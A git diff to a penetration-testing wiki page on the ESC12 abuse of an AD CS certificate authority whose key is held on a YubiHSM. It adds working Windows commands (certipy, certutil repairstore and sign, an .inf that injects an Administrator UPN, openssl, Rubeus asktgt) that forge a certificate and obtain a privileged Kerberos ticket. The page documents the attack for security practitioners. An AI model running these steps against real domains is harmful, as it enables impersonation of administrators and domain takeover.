@@ -1,5 +1,5 @@
 ---
-authors: BlWasp, ShutdownRepo, sckdev
+authors: BlWasp, ShutdownRepo, sckdev, RemiEC
 category: ad
 ---
 
@@ -30,6 +30,8 @@ This is a USB device connected to the CA server via a USB port, or a USB device 
 
 > In order to generate and use keys in the YubiHSM, the Key Storage Provider must use an authentication key (sometimes dubbed "password"). This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext. 
 >  
+> Furthermore, the YubiHSM Key Storage Provider does not check under which user account processes calling it via CNG are running.
+>
 > ([Hans-Joachim Knobloch](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm))
 
 ## Practice
@@ -115,7 +117,8 @@ Then, find a way to configure the USB device server to connect to the attacker c
 
 #### Forge a certificate
 
-If the CA's private key is stored on a physical USB device such as "YubiHSM2", and a shell access is obtained on the PKI server (even with low privileges), it is possible to recover the key.
+If the CA's private key is stored on a physical USB device such as "YubiHSM2", and a shell access is obtained on the PKI server (even with low privileges), it is possible to modify and sign new certificates.  
+This can be used to replicate an ESC1 abuse path and impersonate privileged users.
 
 ::: tabs
 
@@ -126,19 +129,49 @@ At the time of writing, no solution exists to perform this attack from a UNIX-li
 
 === Windows
 
+Retrieve a valid certificate  :
+```powershell
+certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p '$PASSWORD' -template User -ca <CA-Common-Name>
+certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
+certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
+```
+
 From a Windows machine, as a low privileged user connected into the CA server, obtain the CA certificate (it is public) and import it to the user store:
 
 ```powershell
-certutil -addstore -user my 
+certutil -addstore -user my ./root-ca.cer
 ```
 
 Next, the certificate must be associated to the private key in the YubiHSM2 device:
 
 ```powershell
-certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my 
+certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
 ```
 
-Finally, use the CA certificate and its private key with the [`certutil -sign`](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil#-sign) command to forge new arbitrary certificates.
+> [!TIP]
+> Ignore any `CRYPT_E_EXISTS` error at this point.
+
+Use the CA certificate and its private key with the [`certutil -sign`](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil#-sign) command to forge new arbitrary certificates.
+
+```powershell
+certutil -sign ./user_esc12.crt new.crt @extension.inf
+```
+
+The following `.inf` file can be used to add a custom `SubjectAltName`, similarly to the ESC1 abuse.
+
+```powershell
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "UPN=Administrator@esc.local&"
+```
+Finally, recreate the PFX file and use it to retrieve a TGT as a privileged user.
+
+```powershell
+openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
+
+Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
+```
+
 
 :::
 
@@ -152,3 +185,5 @@ Finally, use the CA certificate and its private key with the [`certutil -sign`](
 [https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
 
 [https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
+
+[https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
